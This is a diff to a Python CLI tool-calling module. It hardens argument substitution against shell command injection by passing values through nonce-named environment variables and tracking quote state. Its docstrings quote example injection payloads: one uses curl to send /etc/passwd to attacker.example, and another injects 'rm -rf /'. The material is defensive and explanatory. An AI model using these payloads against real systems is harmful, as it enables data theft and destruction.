@@ -20,9 +20,9 @@ import asyncio
 import json
 import os
 import re
-import shlex
+import secrets
 import sys
-from typing import Dict, Any, List, Optional, Callable, AsyncGenerator
+from typing import Dict, Any, List, Optional, Tuple, AsyncGenerator
 
 from utcp.interfaces.communication_protocol import CommunicationProtocol
 from utcp.data.call_template import CallTemplate, CallTemplateSerializer
@@ -241,9 +241,15 @@ class CliCommunicationProtocol(CommunicationProtocol):
 
         try:
             # Execute commands using the same approach as call_tool but with no arguments
-            env = self._prepare_environment(manual_call_template)
-            shell_script = self._build_combined_shell_script(manual_call_template.commands, {})
-            
+            base_env = self._prepare_environment(manual_call_template)
+            shell_script, arg_env = self._build_combined_shell_script(
+                manual_call_template.commands, {}
+            )
+            # Per-call __UTCP_ARG_* env vars carry placeholder values;
+            # layer them on top of the inherited+caller-supplied env so
+            # the references emitted into the script actually resolve.
+            env = {**base_env, **arg_env}
+
             self._log_info(f"Executing shell script for tool discovery from provider '{manual_call_template.name}'")
 
             stdout, stderr, return_code = await self._execute_shell_script(
@@ -323,68 +329,277 @@ class CliCommunicationProtocol(CommunicationProtocol):
             )
     
     @staticmethod
-    def _shell_quote(value: str) -> str:
-        """Quote a single value so it is interpreted as one literal token by
-        the target shell (`bash` on Unix, `powershell.exe` on Windows).
+    def _make_nonce() -> str:
+        """Generate an unguessable nonce that namespaces the env vars used
+        for argument substitution within a single tool invocation.
 
-        On Unix we delegate to `shlex.quote`. On Windows we wrap the value in
-        a PowerShell single-quoted literal: inside such a literal everything
-        is taken verbatim except `'` itself, which is escaped by doubling
-        (`''`). This blocks the metacharacters PowerShell would otherwise
-        interpret (`;`, `&`, `|`, `` ` ``, `$`, `(`, `)`, `<`, `>`, line
-        breaks).
-
-        Backs GHSA-33p6-5jxp-p3x4: the previous substitution did
-        `str(tool_args[arg_name])` directly into the shell script, which
-        allowed arbitrary command injection (e.g.
-        `"data.csv; curl http://attacker.example/$(cat /etc/passwd)"`).
+        Prevents a template author from being able to write a literal
+        ``${__UTCP_ARG_<nonce>_<name>}`` reference that collides with our
+        substitution slot, which would re-introduce
+        unquoted-variable-expansion injection.
         """
-        if os.name == 'nt':
-            return "'" + value.replace("'", "''") + "'"
-        return shlex.quote(value)
+        return secrets.token_hex(8)
 
-    def _substitute_utcp_args(self, command: str, tool_args: Dict[str, Any]) -> str:
-        """Substitute UTCP_ARG placeholders in command string with tool arguments.
+    @staticmethod
+    def _env_var_name(nonce: str, arg_name: str) -> str:
+        """Compute the env-var name that carries one substituted tool_arg
+        value into the subprocess. The nonce is fresh per invocation so
+        ``${__UTCP_ARG_<nonce>_<name>}`` literals cannot exist in
+        templates authored before invocation time.
+        """
+        return f"__UTCP_ARG_{nonce}_{arg_name}"
 
-        Each substituted value is shell-quoted for the target shell so that
-        attacker-controlled `tool_args` cannot escape the placeholder and
-        inject extra commands. As a side effect, a placeholder always
-        expands to exactly one shell token: callers that need to pass
-        multiple flags / arguments must use multiple placeholders rather
-        than splitting a single string at runtime.
+    _PLACEHOLDER_RE = re.compile(r'UTCP_ARG_([a-zA-Z0-9_]+?)_UTCP_END')
+
+    def _substitute_utcp_args(
+        self,
+        command: str,
+        tool_args: Dict[str, Any],
+        nonce: str,
+    ) -> Tuple[str, Dict[str, str]]:
+        """Substitute ``UTCP_ARG_<name>_UTCP_END`` placeholders in a
+        command string by emitting context-appropriate shell variable
+        references and recording the actual values as env vars on the
+        returned dict. The caller wires those env vars into the
+        subprocess (alongside the call template's ``env_vars`` and the
+        host-inheritance allowlist) so the shell expands them at
+        runtime, AFTER it has already parsed the script. As a result,
+        attacker-controlled ``tool_args`` never get spliced into the
+        script source and therefore cannot inject commands or escape
+        any quoting context.
+
+        Quote-state tracking ensures the emitted reference is correct
+        for its surrounding context:
+
+          bash (Unix):
+            - bare:                ``"$VAR"``      (quoted: no word splitting)
+            - inside double quotes: ``${VAR}``     (bash expands inside dq)
+            - inside single quotes: ``'"$VAR"'``   (close sq, dq with var,
+                                                   reopen sq -- bash treats
+                                                   adjacent quoted regions
+                                                   as a single token)
+
+          powershell (Windows):
+            - bare:                ``$env:VAR``
+            - inside double quotes: ``$env:VAR``   (PS expands inside dq)
+            - inside single quotes: ValueError -- PS does not expand inside
+                                                  single-quoted strings, so
+                                                  we cannot safely
+                                                  substitute without
+                                                  rewriting the entire
+                                                  surrounding token. Author
+                                                  must use a double-quoted
+                                                  string.
+
+        Backs GHSA-33p6-5jxp-p3x4. An earlier fix that did inline
+        ``shlex.quote``-style substitution was still vulnerable when
+        the placeholder sat inside a surrounding ``"`` region: e.g.
+        template ``curl "https://api/UTCP_ARG_id_UTCP_END"`` with
+        ``id = '"; rm -rf /; "'`` produced
+        ``curl "https://api/'"; rm -rf /; "'"``, where bash's parser
+        closed the outer dq early and ran the injected commands.
 
         Args:
-            command: Command string containing UTCP_ARG_argname_UTCP_END placeholders
-            tool_args: Dictionary of argument names and values
+            command: Command string containing
+                ``UTCP_ARG_<name>_UTCP_END`` placeholders.
+            tool_args: Dictionary of argument names and values.
+            nonce: Per-invocation nonce used to namespace generated env
+                vars.
 
         Returns:
-            Command string with placeholders replaced by shell-quoted values
+            Tuple ``(command, env)`` where ``command`` is safe to embed
+            in a shell script and ``env`` is the additional env vars
+            the subprocess must receive for the references to expand.
         """
-        # Pattern to match UTCP_ARG_argname_UTCP_END
-        pattern = r'UTCP_ARG_(.+?)_UTCP_END'
+        if os.name == 'nt':
+            return self._substitute_powershell(command, tool_args, nonce)
+        return self._substitute_bash(command, tool_args, nonce)
 
-        def replace_placeholder(match):
-            arg_name = match.group(1)
-            if arg_name in tool_args:
-                return self._shell_quote(str(tool_args[arg_name]))
+    def _substitute_bash(
+        self,
+        command: str,
+        tool_args: Dict[str, Any],
+        nonce: str,
+    ) -> Tuple[str, Dict[str, str]]:
+        env: Dict[str, str] = {}
+        out: List[str] = []
+        state = "normal"  # "normal" | "dq" | "sq"
+        i = 0
+        n = len(command)
+
+        def collect(name: str) -> str:
+            v = self._env_var_name(nonce, name)
+            if name in tool_args:
+                env[v] = str(tool_args[name])
             else:
-                self._log_error(f"Missing argument '{arg_name}' for placeholder in command: {command}")
-                return self._shell_quote(f"MISSING_ARG_{arg_name}")
+                self._log_error(
+                    f"Missing argument '{name}' for placeholder in command: {command}"
+                )
+                env[v] = f"MISSING_ARG_{name}"
+            return v
 
-        return re.sub(pattern, replace_placeholder, command)
+        while i < n:
+            m = self._PLACEHOLDER_RE.match(command, i)
+            if m is not None:
+                v = collect(m.group(1))
+                if state == "normal":
+                    out.append(f'"${v}"')
+                elif state == "dq":
+                    out.append(f"${{{v}}}")
+                else:  # sq -- break out, dq the var, reopen sq
+                    out.append(f"'\"${v}\"'")
+                i = m.end()
+                continue
+
+            ch = command[i]
+            if state == "normal":
+                if ch == "'":
+                    state = "sq"
+                    out.append(ch)
+                elif ch == '"':
+                    state = "dq"
+                    out.append(ch)
+                elif ch == "\\" and i + 1 < n:
+                    out.append(ch)
+                    out.append(command[i + 1])
+                    i += 2
+                    continue
+                else:
+                    out.append(ch)
+            elif state == "dq":
+                if ch == "\\" and i + 1 < n and command[i + 1] in '"\\$`\n':
+                    out.append(ch)
+                    out.append(command[i + 1])
+                    i += 2
+                    continue
+                if ch == '"':
+                    state = "normal"
+                    out.append(ch)
+                else:
+                    out.append(ch)
+            else:  # sq -- only `'` ends the string. No expansion, no escapes.
+                if ch == "'":
+                    state = "normal"
+                    out.append(ch)
+                else:
+                    out.append(ch)
+            i += 1
+
+        return "".join(out), env
+
+    def _substitute_powershell(
+        self,
+        command: str,
+        tool_args: Dict[str, Any],
+        nonce: str,
+    ) -> Tuple[str, Dict[str, str]]:
+        env: Dict[str, str] = {}
+        out: List[str] = []
+        state = "normal"  # "normal" | "dq" | "sq"
+        i = 0
+        n = len(command)
+
+        def collect(name: str) -> str:
+            v = self._env_var_name(nonce, name)
+            if name in tool_args:
+                env[v] = str(tool_args[name])
+            else:
+                self._log_error(
+                    f"Missing argument '{name}' for placeholder in command: {command}"
+                )
+                env[v] = f"MISSING_ARG_{name}"
+            return v
+
+        while i < n:
+            m = self._PLACEHOLDER_RE.match(command, i)
+            if m is not None:
+                if state == "sq":
+                    raise ValueError(
+                        f"Placeholder UTCP_ARG_{m.group(1)}_UTCP_END appears "
+                        f"inside a PowerShell single-quoted string in "
+                        f"command: {command}\n"
+                        f"PowerShell does not expand variables inside single "
+                        f"quotes, so this cannot be substituted safely. Use a "
+                        f'double-quoted string ("...") around the placeholder '
+                        f"instead."
+                    )
+                v = collect(m.group(1))
+                # Both bare and dq accept `$env:VAR` -- PowerShell expands
+                # it inside double-quoted strings.
+                out.append(f"$env:{v}")
+                i = m.end()
+                continue
+
+            ch = command[i]
+            if state == "normal":
+                if ch == "'":
+                    state = "sq"
+                    out.append(ch)
+                elif ch == '"':
+                    state = "dq"
+                    out.append(ch)
+                elif ch == "`" and i + 1 < n:
+                    out.append(ch)
+                    out.append(command[i + 1])
+                    i += 2
+                    continue
+                else:
+                    out.append(ch)
+            elif state == "dq":
+                if ch == "`" and i + 1 < n:
+                    out.append(ch)
+                    out.append(command[i + 1])
+                    i += 2
+                    continue
+                if ch == '"':
+                    state = "normal"
+                    out.append(ch)
+                else:
+                    out.append(ch)
+            else:  # sq -- PS: `''` is an escaped single quote inside the literal.
+                if ch == "'" and i + 1 < n and command[i + 1] == "'":
+                    out.append(ch)
+                    out.append(command[i + 1])
+                    i += 2
+                    continue
+                if ch == "'":
+                    state = "normal"
+                    out.append(ch)
+                else:
+                    out.append(ch)
+            i += 1
+
+        return "".join(out), env
     
-    def _build_combined_shell_script(self, commands: List[CommandStep], tool_args: Dict[str, Any]) -> str:
+    def _build_combined_shell_script(
+        self,
+        commands: List[CommandStep],
+        tool_args: Dict[str, Any],
+    ) -> Tuple[str, Dict[str, str]]:
         """Build a combined shell script from multiple commands.
-        
+
+        Returns both the script and the env-var contributions
+        accumulated across all command steps. Callers must merge these
+        env vars into the subprocess environment so the placeholder
+        references the script writes (``$VAR`` / ``${VAR}`` /
+        ``$env:VAR``) actually resolve to the original tool_arg values
+        at runtime.
+
         Args:
             commands: List of CommandStep objects to combine
             tool_args: Tool arguments for placeholder substitution
-            
+
         Returns:
-            Shell script string that executes all commands in sequence
+            Tuple ``(script, env)`` -- script is the shell script
+            source, env is the additional ``__UTCP_ARG_*`` env vars to
+            inject.
         """
-        script_lines = []
-        
+        script_lines: List[str] = []
+        accumulated_env: Dict[str, str] = {}
+        # One nonce per script -- shared across all command steps so the
+        # env-var contributions land in a consistent namespace.
+        nonce = self._make_nonce()
+
         # Add error handling and setup
         if os.name == 'nt':
             # PowerShell script
@@ -395,14 +610,18 @@ class CliCommunicationProtocol(CommunicationProtocol):
             script_lines.append('#!/bin/bash')
             # Don't use set -e to allow error output capture and processing
             script_lines.append('# Variables to store command outputs')
-        
+
         # Execute each command and store output in variables
         for i, command_step in enumerate(commands):
-            # Substitute UTCP_ARG placeholders
-            substituted_command = self._substitute_utcp_args(command_step.command, tool_args)
-            
+            # Substitute UTCP_ARG placeholders -- emits shell-variable
+            # references, contributes the actual values via env.
+            substituted_command, step_env = self._substitute_utcp_args(
+                command_step.command, tool_args, nonce
+            )
+            accumulated_env.update(step_env)
+
             var_name = f"CMD_{i}_OUTPUT"
-            
+
             if os.name == 'nt':
                 # PowerShell - capture command output in variable
                 script_lines.append(f'${var_name} = {substituted_command} 2>&1 | Out-String')
@@ -427,8 +646,8 @@ class CliCommunicationProtocol(CommunicationProtocol):
                 else:
                     # Unix shell
                     script_lines.append(f'echo "${{{var_name}}}"')
-        
-        return '\n'.join(script_lines)
+
+        return '\n'.join(script_lines), accumulated_env
     
     async def _execute_shell_script(self, script: str, env: Dict[str, str], timeout: float = 60.0, working_dir: Optional[str] = None) -> tuple[str, str, int]:
         """Execute a shell script in a single subprocess.
@@ -697,11 +916,17 @@ class CliCommunicationProtocol(CommunicationProtocol):
         self._log_info(f"Executing CLI tool '{tool_name}' with {len(tool_call_template.commands)} command(s) in single subprocess")
         
         try:
-            env = self._prepare_environment(tool_call_template)
-            
-            # Build combined shell script with output capture
-            shell_script = self._build_combined_shell_script(tool_call_template.commands, tool_args)
-            
+            base_env = self._prepare_environment(tool_call_template)
+
+            # Build combined shell script with output capture. The
+            # script's placeholders are emitted as `$VAR` / `${VAR}` /
+            # `$env:VAR` references; the actual tool_arg values come
+            # back as `arg_env`.
+            shell_script, arg_env = self._build_combined_shell_script(
+                tool_call_template.commands, tool_args
+            )
+            env = {**base_env, **arg_env}
+
             self._log_info("Executing combined shell script")
             
             # Execute the combined script in a single subprocess
